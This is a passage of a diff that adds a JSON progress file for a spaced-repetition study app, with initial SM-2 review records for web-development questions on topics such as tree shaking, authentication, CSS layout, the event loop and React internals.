+      "reviewHistory": [],
+      "createdAt": "2025-12-31T22:18:47.424Z",
+      "updatedAt": "2025-12-31T22:18:47.424Z"
+    },
+    {
+      "id": "progress-bundle-tree-shaking-002",
+      "questionId": "bundle-tree-shaking-002",
+      "sm2": {
+        "easeFactor": 2.5,
+        "interval": 0,
+        "repetitions": 0,
+        "nextReviewDate": "2025-12-31T22:18:47.424Z",
+        "lastReviewDate": null
+      },
+      "totalReviews": 0,
+      "correctReviews": 0,
+      "averageQuality": 0,
+      "reviewHistory": [],
+      "createdAt": "2025-12-31T22:18:47.424Z",
+      "updatedAt": "2025-12-31T22:18:47.424Z"
+    },
+    {
+      "id": "progress-security-auth-001",
+      "questionId": "security-auth-001",
+      "sm2": {
+        "easeFactor": 2.5,
+        "interval": 0,
+        "repetitions": 0,
+        "nextReviewDate": "2025-12-31T22:18:47.424Z",
+        "lastReviewDate": null
+      },
+      "totalReviews": 0,
+      "correctReviews": 0,
+      "averageQuality": 0,
+      "reviewHistory": [],
+      "createdAt": "2025-12-31T22:18:47.424Z",
+      "updatedAt": "2025-12-31T22:18:47.424Z"
+    },
+    {
+      "id": "progress-security-auth-002",
+      "questionId": "security-auth-002",
+      "sm2": {
+        "easeFactor": 2.5,
+        "interval": 0,
+        "repetitions": 0,
+        "nextReviewDate": "2025-12-31T22:18:47.424Z",
+        "lastReviewDate": null
+      },
+      "totalReviews": 0,
+      "correctReviews": 0,
+      "averageQuality": 0,
+      "reviewHistory": [],
+      "createdAt": "2025-12-31T22:18:47.424Z",
+      "updatedAt": "2025-12-31T22:18:47.424Z"
+    },
+    {
+      "id": "progress-feature-flags-001",
+      "questionId": "feature-flags-001",
+      "sm2": {
+        "easeFactor": 2.5,
+        "interval": 0,
+        "repetitions": 0,
+        "nextReviewDate": "2025-12-31T22:18:47.424Z",
+        "lastReviewDate": null
+      },
+      "totalReviews": 0,
+      "correctReviews": 0,
+      "averageQuality": 0,
+      "reviewHistory": [],
+      "createdAt": "2025-12-31T22:18:47.424Z",
+      "updatedAt": "2025-12-31T22:18:47.424Z"
+    },
+    {
+      "id": "progress-feature-flags-002",
+      "questionId": "feature-flags-002",
+      "sm2": {
+        "easeFactor": 2.5,
+        "interval": 0,
+        "repetitions": 0,
+        "nextReviewDate": "2025-12-31T22:18:47.424Z",
+        "lastReviewDate": null
+      },
+      "totalReviews": 0,
+      "correctReviews": 0,
+      "averageQuality": 0,
+      "reviewHistory": [],
+      "createdAt": "2025-12-31T22:18:47.424Z",
+      "updatedAt": "2025-12-31T22:18:47.424Z"
+    },
+    {
+      "id": "progress-css-layout-001",
+      "questionId": "css-layout-001",
+      "sm2": {
+        "easeFactor": 2.5,
+        "interval": 0,
+        "repetitions": 0,
+        "nextReviewDate": "2025-12-31T22:18:47.424Z",
+        "lastReviewDate": null
+      },
+      "totalReviews": 0,
+      "correctReviews": 0,
+      "averageQuality": 0,
+      "reviewHistory": [],
+      "createdAt": "2025-12-31T22:18:47.424Z",
+      "updatedAt": "2025-12-31T22:18:47.424Z"
+    },
+    {
+      "id": "progress-css-layout-002",
+      "questionId": "css-layout-002",
+      "sm2": {
+        "easeFactor": 2.5,
+        "interval": 0,
+        "repetitions": 0,
+        "nextReviewDate": "2025-12-31T22:18:47.424Z",
+        "lastReviewDate": null
+      },
+      "totalReviews": 0,
+      "correctReviews": 0,
+      "averageQuality": 0,
+      "reviewHistory": [],
+      "createdAt": "2025-12-31T22:18:47.424Z",
+      "updatedAt": "2025-12-31T22:18:47.424Z"
+    },
+    {
+      "id": "progress-css-layout-003",
+      "questionId": "css-layout-003",
+      "sm2": {
+        "easeFactor": 2.5,
+        "interval": 0,
+        "repetitions": 0,
+        "nextReviewDate": "2025-12-31T22:18:47.424Z",
+        "lastReviewDate": null
+      },
+      "totalReviews": 0,
+      "correctReviews": 0,
+      "averageQuality": 0,
+      "reviewHistory": [],
+      "createdAt": "2025-12-31T22:18:47.424Z",
+      "updatedAt": "2025-12-31T22:18:47.424Z"
+    },
+    {
+      "id": "progress-js-event-loop-001",
+      "questionId": "js-event-loop-001",
+      "sm2": {
+        "easeFactor": 2.5,
+        "interval": 0,
+        "repetitions": 0,
+        "nextReviewDate": "2025-12-31T22:18:47.424Z",
+        "lastReviewDate": null
+      },
+      "totalReviews": 0,
+      "correctReviews": 0,
+      "averageQuality": 0,
+      "reviewHistory": [],
+      "createdAt": "2025-12-31T22:18:47.424Z",
+      "updatedAt": "2025-12-31T22:18:47.424Z"
+    },
+    {
+      "id": "progress-js-event-loop-002",
+      "questionId": "js-event-loop-002",
+      "sm2": {
+        "easeFactor": 2.5,
+        "interval": 0,
+        "repetitions": 0,
+        "nextReviewDate": "2025-12-31T22:18:47.424Z",
+        "lastReviewDate": null
+      },
+      "totalReviews": 0,
+      "correctReviews": 0,
+      "averageQuality": 0,
+      "reviewHistory": [],
+      "createdAt": "2025-12-31T22:18:47.424Z",
+      "updatedAt": "2025-12-31T22:18:47.424Z"
+    },
+    {
+      "id": "progress-accessibility-001",
+      "questionId": "accessibility-001",
+      "sm2": {
+        "easeFactor": 2.5,
+        "interval": 0,
+        "repetitions": 0,
+        "nextReviewDate": "2025-12-31T22:18:47.424Z",
+        "lastReviewDate": null
+      },
+      "totalReviews": 0,
+      "correctReviews": 0,
+      "averageQuality": 0,
+      "reviewHistory": [],
+      "createdAt": "2025-12-31T22:18:47.424Z",
+      "updatedAt": "2025-12-31T22:18:47.424Z"
+    },
+    {
+      "id": "progress-accessibility-002",
+      "questionId": "accessibility-002",
+      "sm2": {
+        "easeFactor": 2.5,
+        "interval": 0,
+        "repetitions": 0,
+        "nextReviewDate": "2025-12-31T22:18:47.424Z",
+        "lastReviewDate": null
+      },
+      "totalReviews": 0,
+      "correctReviews": 0,
+      "averageQuality": 0,
+      "reviewHistory": [],
+      "createdAt": "2025-12-31T22:18:47.424Z",
+      "updatedAt": "2025-12-31T22:18:47.424Z"
+    },
+    {
+      "id": "progress-react-internals-001",
+      "questionId": "react-internals-001",
+      "sm2": {
+        "easeFactor": 2.5,
+        "interval": 0,
+        "repetitions": 0,
+        "nextReviewDate": "2025-12-31T22:18:47.424Z",
+        "lastReviewDate": null
+      },
+      "totalReviews": 0,
+      "correctReviews": 0,
+      "averageQuality": 0,
+      "reviewHistory": [],
+      "createdAt": "2025-12-31T22:18:47.424Z",
+      "updatedAt": "2025-12-31T22:18:47.424Z"
+    },
+    {
+      "id": "progress-react-internals-002",
+      "questionId": "react-internals-002",
+      "sm2": {
+        "easeFactor": 2.5,
+        "interval": 0,
+        "repetitions": 0,
+        "nextReviewDate": "2025-12-31T22:18:47.424Z",
+        "lastReviewDate": null
+      },
+      "totalReviews": 0,
+      "correctReviews": 0,
+      "averageQuality": 0,
+      "reviewHistory": [],
+      "createdAt": "2025-12-31T22:18:47.424Z",
+      "updatedAt": "2025-12-31T22:18:47.424Z"
+    },
+    {
+      "id": "progress-react-internals-003",
+      "questionId": "react-internals-003",
+      "sm2": {
+        "easeFactor": 2.5,
+        "interval": 0,
+        "repetitions": 0,
+        "nextReviewDate": "2025-12-31T22:18:47.424Z",
+        "lastReviewDate": null
+      },
+      "totalReviews": 0,
+      "correctReviews": 0,
+      "averageQuality": 0,
+      "reviewHistory": [],
+      "createdAt": "2025-12-31T22:18:47.424Z",
+      "updatedAt": "2025-12-31T22:18:47.424Z"
+    }
+  ],
+  "sessions": [],
+  "meta": {
+    "version": 1,
+    "createdAt": "2025-12-31T22:18:47.424Z",
+    "lastUpdatedAt": "2025-12-31T22:21:04.443Z",
+    "questionCount": 27,
+    "seedVersion": "1.0.0"
+  }
+}
